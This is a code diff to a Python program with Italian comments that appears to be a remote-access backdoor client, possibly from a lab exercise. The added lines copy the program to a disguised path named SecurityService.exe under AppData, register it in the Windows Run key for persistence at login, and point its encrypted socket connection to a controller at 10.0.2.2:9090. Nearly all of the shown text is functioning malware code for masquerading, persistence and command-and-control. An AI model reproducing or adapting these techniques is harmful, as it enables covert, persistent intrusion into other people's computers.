@@ -6,13 +6,22 @@ from Crypto.Cipher import AES # Algoritmo di crittografia a chiave simmetrica
 
 import sys
 import shutil
-import os
+import winreg, getpass
 
-target_path = "A:\\Desktop\\WindowsDriver.exe"
+#target_path = "A:\\Desktop\\WindowsDriver.exe"
+user = getpass.getuser()
+target_path = "C:\\Users\\" + user + "\\AppData\\Local\\Microsoft\\Windows\\Safety\\SecurityService.exe"
 try:
     shutil.copyfile(sys.argv[0], target_path)
 except shutil.SameFileError:
    pass
+
+reghive = winreg.HKEY_CURRENT_USER
+regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+
+reg = winreg.ConnectRegistry(None, reghive)
+key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
+winreg.SetValueEx(key, "SecurityService", 0, winreg.REG_SZ, target_path)
 
 
 def encryptData(textToEncrypt: str):
@@ -30,8 +39,8 @@ while not connected:
     print("> Connessione... ")  
 
     try:  
-        #clientSocket.connect(("10.0.2.2",9090))
-        clientSocket.connect(("127.0.0.1",9090))
+        clientSocket.connect(("10.0.2.2",9090))
+        #clientSocket.connect(("127.0.0.1",9090))
         connected = True  
         print( "> Connessione eseguita" )
 
